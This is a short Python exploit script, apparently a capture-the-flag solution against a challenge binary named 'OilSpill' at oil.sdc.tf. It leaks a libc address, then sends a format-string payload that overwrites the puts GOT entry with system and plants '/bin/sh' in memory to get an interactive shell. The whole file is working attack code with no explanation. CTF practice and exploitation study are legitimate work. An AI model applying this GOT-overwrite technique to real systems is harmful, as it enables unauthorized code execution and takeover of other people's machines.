#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe  = context.binary = ELF('./OilSpill')
host = args.HOST or 'oil.sdc.tf'
port = int(args.PORT or 1337)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

libc=SetupLibcELF()
io = start()

leaks=GetInt(rl())
libc.address = leaks[0]-libc.sym.puts
re()
payload = fmtstr_payload(8, {exe.got.puts : libc.sym.system, 0x600c80 : b"/bin/sh\x00"}, write_size='short')
lb()
pause()
sl(payload)

io.interactive()
